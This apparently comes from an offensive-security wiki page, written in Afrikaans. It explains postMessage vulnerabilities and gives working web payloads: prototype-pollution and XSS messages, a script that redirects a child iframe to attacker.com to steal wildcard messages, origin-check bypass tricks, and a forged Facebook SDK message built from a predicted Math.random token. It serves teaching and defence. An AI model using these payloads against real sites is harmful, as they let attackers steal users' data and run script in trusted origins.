# PostMessage Kwesbaarhede

{{#include ../../banners/hacktricks-training.md}}

## Stuur **PostMessage**

**PostMessage** gebruik die volgende funksie om 'n boodskap te stuur:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Noteer dat **targetOrigin** 'n '\*' kan wees of 'n URL soos _https://company.com._\
In die **tweede scenario**, kan die **boodskap slegs na daardie domein gestuur word** (selfs as die origin van die Window object anders is).\
As die **wildcard** gebruik word, **kan boodskappe na enige domein gestuur word**, en sal dit na die origin van die Window object gestuur word.

### Aanval op iframe & wildcard in **targetOrigin**

Soos verduidelik in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) as jy 'n bladsy vind wat **iframed** kan word (geen `X-Frame-Header` beskerming nie) en wat **sensitiewe** boodskap via **postMessage** met 'n **wildcard** (\* ) stuur, kan jy die **origin** van die **iframe** **wysig** en die **sensitive** boodskap na 'n domein wat deur jou beheer word **leak**.\
Let wel dat as die bladsy iframed kan word maar die **targetOrigin** **op 'n URL en nie op 'n wildcard' gestel is**, sal hierdie **truuk nie werk nie**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** is die funksie wat deur JS gebruik word om die funksie te verklaar wat **`postMessages`** verwag.\
Kode soortgelyk aan die volgende sal gebruik word:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Noteer in hierdie geval hoe die **eerste ding** wat die kode doen, is om die **origin te kontroleer**. Dit is uiters **belangrik**, veral as die bladsy van plan is om **iets sensitiefs** met die ontvangde inligting te doen (soos om 'n wagwoord te verander). **As dit nie die origin kontroleer nie, kan aanvallers slagoffers dwing om ewekansige data na hierdie endpoints te stuur** en die slagoffers se wagwoorde verander (in hierdie voorbeeld).

### Enumerasie

Om **event listeners te vind** op die huidige bladsy kan jy:

- **Soek** die JS-kode vir `window.addEventListener` en `$(window).on` (_JQuery version_)
- **Voer uit** in the developer tools console: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Gaan na** _Elements --> Event Listeners_ in the developer tools of the browser

![](<../../images/image (396).png>)

- Gebruik 'n **browser extension** soos [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) of [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Hierdie blaaieruitbreidings sal alle boodskappe **afvang** en aan jou wys.

### Origin-kontrole omseilings

- Die **`event.isTrusted`**-attribuut word as veilig beskou aangesien dit slegs `True` teruggee vir events wat gegenereer is deur genuine user actions. Alhoewel dit moeilik is om te omseil indien korrek geïmplementeer, is die betekenis daarvan in sekuriteitskontroles noemenswaardig.
- Die gebruik van **`indexOf()`** vir origin-validasie in PostMessage-events kan vatbaar wees vir omseiling. 'n Voorbeeld wat hierdie kwesbaarheid illustreer is:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Die **`search()`** metode van `String.prototype.search()` is bedoel vir regular expressions, nie vir strings nie. Om enigiets anders as 'n regexp te stuur lei tot implisiete omskakeling na regex, wat die metode potensieel onveilig maak. Dit is omdat in regex 'n punt (.) as 'n wildcard optree, wat die omseiling van validasie met spesiaal saamgestelde domeine moontlik maak. Byvoorbeeld:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Die **`match()`** funksie, soortgelyk aan `search()`, verwerk regex. As die regex verkeerd gestruktureer is, kan dit vatbaar wees vir omseiling.
- Die **`escapeHtml`** funksie is bedoel om insette te sanitiseer deur karakters te ontsnap. Dit skep egter nie 'n nuwe ontsnapte objek nie, maar oorskryf die eienskappe van die bestaande objek. Hierdie gedrag kan uitgebuit word. Veral as 'n objek so gemanipuleer kan word dat 'n beheerde eienskap nie `hasOwnProperty` erken nie, sal `escapeHtml` nie soos verwag werk nie. Dit word in die voorbeelde hieronder gedemonstreer:

- Verwachte mislukking:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Omseiling van die ontsnapping:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

In die konteks van hierdie kwesbaarheid is die `File`-objek besonder uitbuitbaar weens sy read-only `name`-eienskap. Hierdie eienskap, wanneer dit in templates gebruik word, word nie deur die `escapeHtml`-funksie gesanitiseer nie, wat tot potensiële sekuriteitsrisiko's lei.

- Die `document.domain` eienskap in JavaScript kan deur 'n skrip gestel word om die domein te verkort, wat 'n meer versoepelde same-origin beleidstoepassing binne dieselfde parent domain toelaat.

### e.origin == window.origin omseiling

Wanneer 'n webblad in 'n **sandboxed iframe** ingesluit word met behulp van %%%%%%, is dit noodsaaklik om te verstaan dat die iframe se origin op null gestel sal word. Dit is veral belangrik wanneer daar met **sandbox attributes** gewerk word en wat dit vir sekuriteit en funksionaliteit beteken.

Deur **`allow-popups`** in die sandbox-attribuut te spesifiseer, erf enige popup-venster wat vanaf die iframe geopen word die sandbox-beperkings van sy ouer. Dit beteken dat tensy die **`allow-popups-to-escape-sandbox`** attribuut ook ingesluit is, die origin van die popup-venster ook op `null` gestel word, ooreenstemmend met die iframe se origin.

Gevolglik, wanneer 'n popup onder hierdie toestande geopen word en 'n boodskap vanaf die iframe na die popup gestuur word met **`postMessage`**, het beide die stuur- en ontvangskante hul origins op `null` gestel. Hierdie situasie lei tot 'n toestand waar **`e.origin == window.origin`** tot true evalueer (`null == null`), omdat beide die iframe en die popup dieselfde origin-waarde van `null` deel.

Vir meer inligting **lees**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### e.source omseiling

Dit is moontlik om te kontroleer of die boodskap van dieselfde venster gekom het waarin die skrip luister (veral interessant vir **Content Scripts from browser extensions** om te kyk of die boodskap vanaf dieselfde bladsy gestuur is):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Jy kan die **`e.source`** van 'n boodskap op null dwing deur 'n **iframe** te skep wat die **postMessage** **stuur** en **onmiddellik verwyder word**.

For more information **read:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Om hierdie aanvalle uit te voer sal jy idealiter in staat wees om **die slagoffer se webblad binne 'n `iframe` te plaas**. Maar sommige headers soos `X-Frame-Header` kan daardie **gedrag** **voorkom**.\
In daardie scenario's kan jy steeds 'n minder sluipende aanval gebruik. Jy kan 'n nuwe tabblad na die kwesbare webtoepassing oopmaak en daarmee kommunikeer:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Boodskap gesteel wat aan child gestuur is deur die main page te blokkeer

Op die volgende bladsy kan jy sien hoe jy 'n **sensitive postmessage data** wat aan 'n **child iframe** gestuur is, kan steel deur die **blocking** van die **main** page voordat die data gestuur word, en 'n **XSS in the child** te misbruik om die data te **leak** voordat dit ontvang word:

{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Boodskap steel deur iframe location te wysig

As jy 'n webpage kan iframe sonder X-Frame-Header wat 'n ander iframe bevat, kan jy **change the location of that child iframe**. As dit 'n **postmessage** ontvang wat met 'n **wildcard** gestuur is, kan 'n aanvaller daardie iframe se **origin** na 'n page **controlled** deur hom verander en die boodskap **steal**:

{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage na Prototype Pollution en/of XSS

In scenario's waar die data wat deur `postMessage` gestuur word deur JS uitgevoer word, kan jy die **iframe** gebruik om die **page** te **exploit** en die **prototype pollution/XSS** deur `postMessage` te stuur.

A couple of **very good explained XSS though `postMessage`** can be found in [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Voorbeeld van 'n exploit om **Prototype Pollution and then XSS** deur `postMessage` na 'n `iframe` te misbruik:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Vir **meer inligting**:

- Link to page about [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link to page about [**XSS**](../xss-cross-site-scripting/index.html)
- Link to page about [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Voorspel van **`Math.random()`** callback tokens in postMessage bridges

Wanneer boodskapvalidasie 'n “shared secret” gebruik wat gegenereer word met `Math.random()` (bv., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) en dieselfde helper ook plugin-iframes benoem, kan jy PRNG-uitsette herstel en vertroude boodskappe vervals:

- **Leak PRNG outputs via `window.name`:** Die SDK noem plugin-iframes outomaties met `guid()`. As jy die top frame beheer, iframe die slagofferbladsy, navigeer dan die plugin-iframe na jou origin (bv., `window.frames[0].frames[0].location='https://attacker.com'`) en lees `window.frames[0].frames[0].name` om 'n rou `Math.random()` uitset te verkry.
- **Kry meer uitsette sonder herlaai:** Sommige SDK's bied 'n reinit-pad; in die FB SDK veroorsaak die stuur van `init:post` met `{xfbml:1}` dat `XFBML.parse()` aangeroep word, die plugin-iframe vernietig/hernieubou word, en nuwe name/callback-ID's gegenereer word. Herhaalde reinit produseer soveel PRNG-uitsette as nodig (let op ekstra interne `Math.random()`-oproepe vir callback/iframe-ID's, dus moet oplossers tussentydse waardes oorslaan).
- **Trusted-origin delivery via parameter pollution:** As 'n first-party plugin-endpoint 'n ongefilterde parameter in die cross-window payload weerspieël (bv., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), kan jy `&type=...&iconSVG=...` injekteer terwyl die vertroude `facebook.com` origin behoue bly.
- **Predict the next callback:** Skakel leaked iframe-names terug na floats in `[0,1)` en voer verskeie waardes (selfs nie-aaneenlopende) in 'n V8 `Math.random` voorspellingsinstrument (bv., Z3-gebaseerd). Genereer plaaslik die volgende `guid()` om die verwagte callback-token te forge.
- **Trigger the sink:** Stel die postMessage-data so op dat die bridge `xd.mpn.setupIconIframe` dispatch en HTML in `iconSVG` injecteer (bv., URL-geënkodeerde `<img src=x onerror=...>`), wat DOM XSS binne die hosting origin bewerkstellig; van daar af kan same-origin iframes (OAuth dialogs, arbiters, ens.) gelees word.
- **Framing quirks help:** Die ketting benodig framing. In sommige mobiele webviews kan `X-Frame-Options` degradeer na onondersteunde `ALLOW-FROM` wanneer `frame-ancestors` teenwoordig is, en “compat” parameters kan permissiewe `frame-ancestors` afdwing, wat die `window.name` side channel moontlik maak.

#### Minimale voorbeeld van 'n vervalste boodskap
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Verwysings

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- Om te oefen: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
